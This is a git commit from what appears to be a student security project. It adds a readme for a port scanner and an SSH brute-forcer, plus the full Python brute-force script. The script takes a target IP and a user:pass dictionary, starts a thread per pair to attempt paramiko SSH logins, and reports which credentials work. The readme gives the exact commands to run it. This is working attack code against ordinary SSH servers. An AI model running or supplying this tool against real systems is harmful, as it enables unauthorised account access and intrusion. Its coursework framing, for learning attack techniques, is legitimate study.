958a6298734d9057a9c54a2186ce6e4b86c25175
bosz <fongohmartin@gmail.com>
2016-06-04 08:52:39 +0100

    project 1, group 5 ssh & bruteforce

--- project 3 - portScanner & bruteForce/group 5/readme.md
+++ project 3 - portScanner & bruteForce/group 5/readme.md
@@ -1,8 +1,18 @@
 Sample Readme
 # Project Title
+port scanner and ssh bruteforce
 
 # Prerequisite
+python 
+	v 2.7
+term color 
+	 sudo apt-get install  python-termcolor
 
+# Execution
+### port scanner
+	python simpleportscanner.py ip-address
+		or
+	python portscanner.py
+### ssh-bruteforce
+	python ssh-bruteforce.py  ip-address dict.txt
 # Brief Description
-
-# Conclusion
---
+++ project 3 - portScanner & bruteForce/group 5/ssh-bruteforcer/ssh-bruteforce.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python
+import paramiko, sys, time, threading
+from termcolor import colored
+
+
+
+if len(sys.argv) < 3:
+	# Checks how the command is written, if not so, then show 
+	# the usage.
+    print "Usage: %s IP /path/to/dictionary" % (str(sys.argv[0]))
+    print "Example: %s 10.0.0.1 dict.txt" % (str(sys.argv[0]))
+    print "Dictionary should be in user:pass format"
+    sys.exit(1)
+
+ip=sys.argv[1]; filename=sys.argv[2]
+
+# Open the password file with the usernames
+fd = open(filename, "r")
+
+# Function to attempt to crack the password using 
+# the brute-force algorithm
+def attempt(IP,UserName,Password):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(IP, username=UserName, password=Password)
+    except paramiko.AuthenticationException:
+        print colored('[-] %s:%s FAIL!' % (UserName, Password), 'red')
+    else:
+        print colored('[+] %s:%s is CORRECT!' % (UserName, Password), 'green')
+    ssh.close()
+    return
+
+print '[+] Brute-forcing against %s with dictionary %s' % (ip, filename)
+for line in fd.readlines():
+    username, password = line.strip().split(":")
+    t = threading.Thread(target=attempt, args=(ip,username,password))
+    t.start()
+    time.sleep(0.3)
+    
+# Closes the file and exits the program
+fd.close()
+sys.exit(0)
